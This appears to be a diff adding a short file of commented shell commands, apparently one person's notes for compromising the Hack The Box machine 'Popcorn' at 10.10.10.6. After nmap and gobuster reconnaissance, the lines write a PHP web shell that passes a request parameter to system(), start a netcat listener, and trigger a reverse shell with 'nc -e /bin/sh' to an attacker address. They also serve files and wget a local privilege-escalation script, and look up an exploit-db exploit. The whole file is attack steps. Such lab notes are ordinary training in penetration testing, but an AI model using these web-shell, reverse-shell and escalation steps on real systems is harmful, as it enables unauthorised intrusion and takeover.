@@ -1,0 +1,18 @@
+#nmap -sC -sV -oA nmap/popcorn-10.10.10.6 10.10.10.6
+#nmap -T4 -A -v 10.10.10.6
+#http http://10.10.10.6
+#gobuster -u http://10.10.10.6/torrent -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -o popcorn-10.10.10.6-gobuster-report
+#http http://10.10.10.6/index
+#http http://10.10.10.6/test
+#http http://10.10.10.6/torrent
+#touch cmd.php && echo "<? echo system($_REQUEST['cmd']); ?>" >cmd.php && cat cmd.php
+#touch cmd.php && echo "<? echo system($_GET['cmd']); ?>" >cmd.php && cat cmd.php
+#locate 14339.sh >> /usr/share/exploitdb/exploits/linux/local/14339.sh
+#nc -nvlp 1337
+#.php?cmd=nc -e /bin/sh 10.10.14.8 1337
+#locate  SimpleHTTPServer
+#python /usr/lib/python2.7/SimpleHTTPServer.py
+#python -m SimpleHTTPServer.py 
+#wget http://10.10.14.8:8000/motd-exploit.sh
+#find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
+#dpkg -l |grep pam
